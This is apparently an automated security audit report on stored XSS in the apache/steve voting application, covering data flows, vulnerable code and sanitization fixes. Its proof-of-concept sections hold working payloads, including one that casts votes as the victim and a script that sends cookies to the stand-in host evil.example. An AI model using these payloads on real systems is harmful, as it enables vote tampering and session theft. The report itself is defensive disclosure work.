# ASVS 1.3.1 Security Audit Report

## Executive Summary

**Repository:** apache/steve  
**Audit Date:** Apr 22, 2026  
**Auditor:** Tooling Agents  
**ASVS Requirement:** 1.3.1 — Verify that all untrusted HTML input from WYSIWYG editors or similar is sanitized using a well-known and secure HTML sanitization library or framework feature.

**Level:** 1  
**Section:** Sanitization  
**Section Description:** The ideal protection against using untrusted content in an unsafe context is to use context-specific encoding or escaping, which maintains the same semantic meaning of the unsafe content but renders it safe for use in that particular context, as discussed in more detail in the previous section.

Where this is not possible, sanitization becomes necessary, removing potentially dangerous characters or content. In some cases, this may change the semantic meaning of the input, but for security reasons, there may be no alternative.

### Key Findings

The audit reveals a **CRITICAL** stored cross-site scripting (XSS) vulnerability stemming from the complete absence of HTML sanitization for user-supplied election/issue content. The EZT templating system does **not** auto-escape HTML, and the codebase explicitly constructs HTML from untrusted input without any sanitization library. The EZT `[format "html"]` escape mechanism exists and is used in JavaScript attribute contexts within the same templates, but is **not applied** when rendering the same data in HTML body contexts — a textbook Type B (false confidence) gap.

## Findings

### Critical Severity

#### ASVS-131-CRT-001: Stored XSS via Unsanitized Issue Descriptions Rendered as Raw HTML

**Severity:** CRITICAL  
**Gap Type:** Type B — Control EXISTS (`[format "html"]`) but NOT CALLED at HTML body render points

**Location:**

1. **Sink (HTML construction without sanitization):** `v3/server/pages.py`, function `rewrite_description()`, lines ~54-61
2. **Sink (unescaped HTML body rendering):** `v3/server/templates/vote-on.ezt`, line containing `[issues.description]`
3. **Sink (unescaped HTML body rendering):** `v3/server/templates/manage.ezt`, line containing `[issues.description]`
4. **Sink (unescaped HTML body rendering):** `v3/server/templates/manage-stv.ezt`, line containing `[issues.description]`
5. **Source (user input):** `v3/server/pages.py`, function `do_add_issue_endpoint()`, line ~466: `form.description`
6. **Source (user input):** `v3/server/pages.py`, function `do_edit_issue_endpoint()`, line ~485: `form.description`

**Related Functions Checked:**
- `rewrite_description()` - pages.py ~line 54
- `do_add_issue_endpoint()` - pages.py ~line 466
- `do_edit_issue_endpoint()` - pages.py ~line 485
- `election.add_issue()` - election.py ~line 202
- Template rendering in vote-on.ezt, manage.ezt, manage-stv.ezt

**Description:**

The application accepts user-controlled issue descriptions and explicitly constructs HTML from this untrusted input without any sanitization. The `rewrite_description()` function wraps descriptions in `<pre>` tags and converts `doc:filename` patterns into HTML anchor tags, but performs no HTML sanitization on the user input before or after this transformation.

The EZT templating engine does not auto-escape HTML output. While the codebase demonstrates awareness of escaping by using `[format "js,html"]` for JavaScript contexts, this escaping is **not applied** when the same data is rendered in HTML body contexts, creating a critical stored XSS vulnerability.

**Vulnerable Code:**

In `pages.py`, the `rewrite_description` function explicitly constructs HTML from untrusted input:

```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description  # <-- user-controlled, from database
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'  # <-- raw HTML construction
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'  # <-- wraps unsanitized content in HTML
```

In the templates, the same data is rendered with and without escaping — proving the control exists but isn't applied:

```html
<!-- manage.ezt: ESCAPED in JS context (control exists) -->
onclick="openEditIssueModal('[issues.iid]',
                            '[format "js,html"][issues.title][end]',
                            '[format "js,html"][issues.description][end]')"

<!-- manage.ezt: NOT ESCAPED in HTML body (control not called) -->
<strong>[issues.title]</strong>
...
<div id="description-[issues.iid]" class="description mt-2">[issues.description]</div>
```

**Data Flow:**

```
POST /do-add-issue/<eid>
  form.description (attacker-controlled)
    → election.add_issue(form.title, form.description, ...) [pages.py ~468]
      → c_add_issue.perform(..., description, ...) [election.py ~202]
        → stored in SQLite issue table

GET /vote-on/<eid>  (by victim voter)
  election.list_issues() [pages.py ~254]
    → rewrite_description(issue) [pages.py ~261]
      → wraps in <pre>, no HTML escaping
        → rendered as [issues.description] in vote-on.ezt
          → RAW HTML output to victim's browser
```

**Proof of Concept:**

An authenticated committer (election owner) creates an issue:

```http
POST /do-add-issue/abcdef0123 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: [valid session]

title=Normal+Looking+Title&description=<img+src=x+onerror="fetch('/do-vote/'+document.querySelector('[name^=vote-]').name.split('-')[1],{method:'POST',body:new+URLSearchParams({['vote-'+document.querySelector('[name^=vote-]').name.split('-')[1]]:'y'}),credentials:'same-origin'})">
```

When any voter visits `/vote-on/abcdef0123`, the description renders as:

```html
<pre><img src=x onerror="fetch('/do-vote/...',{method:'POST',...})"></pre>
```

The injected JavaScript silently submits votes on behalf of the victim voter.

**Impact:**

- **Vote manipulation:** Attacker can submit or modify votes for any voter who views the election page
- **Session hijacking:** Attacker can exfiltrate session cookies of voters and election administrators
- **Privilege escalation:** If a higher-privileged user (PMC member) views the page, their session can be stolen
- **Election integrity compromise:** In a voting system, XSS that can manipulate ballots undermines the entire purpose of the application

**Remediation:**

**Option A (Recommended): Use a server-side HTML sanitization library**

Since `rewrite_description` intentionally constructs HTML (converting `doc:` references to links), a sanitization library should be used to allow only safe HTML elements:

```python
import bleach  # or nh3, or similar well-known library

ALLOWED_TAGS = ['pre', 'a']
ALLOWED_ATTRIBUTES = {'a': ['href']}
ALLOWED_PROTOCOLS = ['https', 'http']

def rewrite_description(issue):
    """Rewrite issue description: sanitize, wrap in <pre>, convert doc:filename to links."""
    import re
    # First, escape all HTML in the raw description
    desc = bleach.clean(issue.description, tags=[], strip=True)
    # Then apply the doc: link conversion on the now-safe text
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    # Wrap in <pre>, then sanitize the final result allowing only safe tags
    issue.description = bleach.clean(
        f'<pre>{desc}</pre>',
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        protocols=ALLOWED_PROTOCOLS,
    )
```

**Option B: Apply EZT HTML escaping consistently in all templates**

For templates that render issue descriptions without the `rewrite_description` processing (manage.ezt, manage-stv.ezt), use EZT format escaping:

```html
<!-- Replace all unescaped renders -->
<strong>[format "html"][issues.title][end]</strong>
<div class="description mt-2">[format "html"][issues.description][end]</div>
```

**Note:** Option B alone is insufficient for `vote-on.ezt` because `rewrite_description` intentionally produces HTML that must not be escaped. Option A is required for that path.

#### ASVS-131-CRT-002: Stored XSS via Unsanitized Election Titles in All Listing Templates

**Severity:** CRITICAL  
**Gap Type:** Type A — Entry point with NO control

**Location:**

1. **Source:** `v3/server/pages.py`, function `do_create_endpoint()`, line ~405: `form.title`
2. **Sink:** `v3/server/templates/admin.ezt`: `<h5 class="card-title">[owned.title]...`
3. **Sink:** `v3/server/templates/voter.ezt`: `<h5 class="card-title mb-3">[open_elections.title]</h5>`
4. **Sink:** `v3/server/templates/manage.ezt`: `<h2>[e_title]</h2>`
5. **Sink:** `v3/server/templates/vote-on.ezt`: `<h1 class="h4 mb-0 fw-semibold">[election.title]</h1>`
6. **Sink:** `v3/server/templates/flashes.ezt`: `[flashes.message]` (flash messages contain `form.title`)

**Related Functions Checked:**
- `do_create_endpoint()` - pages.py ~line 405
- `Election.create()` - election.py
- `flash_success()` - pages.py multiple locations
- `Election.open_to_pid()` - pages.py ~line 147
- Template rendering in admin.ezt, voter.ezt, manage.ezt, vote-on.ezt, flashes.ezt

**Description:**

Election titles are accepted from user input without any sanitization and stored directly in the database. These titles are subsequently rendered in multiple templates without HTML escaping, creating stored XSS vulnerabilities that affect all users who view election listings.

The vulnerability is particularly severe because election titles appear on listing pages viewed by ALL eligible voters, providing broad attack surface. Additionally, titles are embedded in flash messages, which are also rendered without escaping.

**Vulnerable Code:**

```python
# pages.py - do_create_endpoint (~line 405)
form = edict(await quart.request.form)
election = steve.election.Election.create(DB_FNAME, form.title, result.uid)
# form.title stored directly, no sanitization

# Later, flash message embeds raw title:
await flash_success(f'Created election: {form.title}')
```

```html
<!-- voter.ezt - rendered to ALL voters eligible for this election -->
<h5 class="card-title mb-3">[open_elections.title]</h5>

<!-- admin.ezt - rendered to election owner -->
<h5 class="card-title">[owned.title]...

<!-- flashes.ezt - rendered unescaped -->
[flashes.message]
```

**Data Flow:**

```
POST /do-create-election
  form.title (attacker-controlled: '<img src=x onerror=alert(1)>')
    → Election.create(DB_FNAME, form.title, ...) [pages.py ~405]
      → stored in SQLite metadata table
    → flash_success(f'Created election: {form.title}') [pages.py ~410]
      → stored in session flash

GET /voter  (by any eligible voter)
  Election.open_to_pid(DB_FNAME, result.uid) [pages.py ~147]
    → returns election with unsanitized title
      → rendered as [open_elections.title] in voter.ezt
        → RAW HTML output in <h5> tag
```

**Proof of Concept:**

```http
POST /do-create-election HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: [valid PMC member session]

title=Board+Election+2025<script>document.location='https://evil.example/steal?c='+document.cookie</script>
```

All voters viewing the `/voter` page will have their sessions stolen.

**Impact:**

- Identical to ASVS-131-CRT-001: vote manipulation, session hijacking, election integrity compromise
- **Broader reach:** election titles appear on listing pages viewed by ALL eligible voters
- **Higher privilege impact:** Affects PMC members and administrators viewing the admin dashboard
- **Persistent attack vector:** Malicious titles remain active for the entire election lifecycle

**Remediation:**

Apply `[format "html"]` escaping in all EZT templates for user-controlled data:

```html
<!-- voter.ezt -->
<h5 class="card-title mb-3">[format "html"][open_elections.title][end]</h5>

<!-- admin.ezt -->
<h5 class="card-title">[format "html"][owned.title][end]</h5>

<!-- manage.ezt -->
<h2>[format "html"][e_title][end]</h2>

<!-- flashes.ezt -->
[format "html"][flashes.message][end]
```

Additionally, sanitize at the input boundary in the endpoint handlers:

```python
import html

@APP.post('/do-create-election')
@asfquart.auth.require({R.pmc_member})
async def do_create_endpoint():
    result = await basic_info()
    form = edict(await quart.request.form)
    
    # Sanitize title - strip all HTML
    clean_title = html.escape(form.title.strip())
    election = steve.election.Election.create(DB_FNAME, clean_title, result.uid)
    await flash_success(f'Created election: {html.escape(clean_title)}')
    ...
```

## Positive Security Patterns

1. **EZT `[format "js,html"]` used for JavaScript contexts:** In `manage.ezt` and `manage-stv.ezt`, when embedding issue titles and descriptions into JavaScript `onclick` attributes, the codebase correctly applies `[format "js,html"]` escaping. This demonstrates awareness of context-specific encoding.

2. **Client-side `escapeHtml()` function:** The `vote-on.ezt` JavaScript includes a proper HTML escape function used when dynamically generating candidate names in the STV modal.

3. **`send_from_directory()` for file serving:** Static files and documents use Quart's `send_from_directory()`, which prevents path traversal.

4. **Authentication on all sensitive endpoints:** All data-modifying endpoints require authentication via `@asfquart.auth.require`.

5. **SRI integrity attributes:** External JavaScript and CSS resources include `integrity` attributes for subresource integrity verification.

---

## Architecture Observations

1. **EZT templating is unsafe-by-default:** Unlike modern frameworks (Jinja2, Django templates), EZT does not auto-escape HTML output. Every template variable must be manually escaped using `[format "html"]`. This architectural choice makes XSS vulnerabilities the default rather than the exception.

2. **No HTML sanitization library in dependencies:** The codebase does not import or use any HTML sanitization library (such as `bleach`, `nh3`, `html-sanitizer`, or similar). The `rewrite_description()` function is the closest thing to HTML processing, and it constructs HTML without sanitization.

3. **Mixed escaping strategy:** The codebase applies `[format "js,html"]` for JavaScript attribute contexts but leaves HTML body contexts unescaped. This inconsistency creates a false sense of security.

4. **Intentional HTML construction:** The `rewrite_description()` function intentionally constructs HTML (converting `doc:` references to anchor tags), which requires HTML sanitization rather than simple escaping.

5. **Trust boundary violation:** User input from forms is treated as trusted data throughout the application, with no sanitization or validation at entry points.

## Recommendations Summary

### Immediate Actions (Within 24-48 Hours)

1. **Add an HTML sanitization library** (e.g., `nh3` or `bleach`) and apply it in `rewrite_description()` before constructing HTML from user-supplied descriptions.

2. **Apply emergency template patches:** Add `[format "html"]` escaping to ALL user-controlled template variables rendered in HTML body contexts across all `.ezt` templates. Priority files:
   - `voter.ezt` - election titles
   - `admin.ezt` - election titles
   - `manage.ezt` - issue titles and descriptions
   - `manage-stv.ezt` - issue titles and descriptions
   - `vote-on.ezt` - election and issue titles
   - `flashes.ezt` - flash messages

3. **Deploy hotfix immediately:** Given the critical nature of a voting system and the ease of exploitation, these changes should be deployed as an emergency security patch.

### Short-Term Actions (Within 1-2 Weeks)

1. **Implement server-side input sanitization** at the endpoint layer for all user-provided text fields (`form.title`, `form.description`) as defense-in-depth, independent of output encoding.

2. **Conduct comprehensive template audit:** Create a checklist of every `[variable]` reference in all `.ezt` templates and verify appropriate escaping is applied based on context (HTML body, HTML attribute, JavaScript, URL).

3. **Add automated testing:** Implement integration tests that verify XSS payloads are properly escaped in all user-facing pages.

4. **Security code review:** Review all other user input handling for similar vulnerabilities (SQL injection, command injection, path traversal).

### Long-Term Actions (Within 1-3 Months)

1. **Consider migrating to an auto-escaping template engine** (e.g., Jinja2 with `autoescape=True`). EZT's default-unsafe output model is fundamentally incompatible with secure-by-default web application development.

2. **Implement Content Security Policy (CSP):** Add CSP headers to mitigate the impact of any future XSS vulnerabilities.

3. **Establish secure development guidelines:** Document secure coding practices for the team, including mandatory output escaping rules and sanitization requirements.

4. **Implement security training:** Ensure all developers understand XSS vulnerabilities, context-specific encoding, and the importance of output escaping in EZT templates.
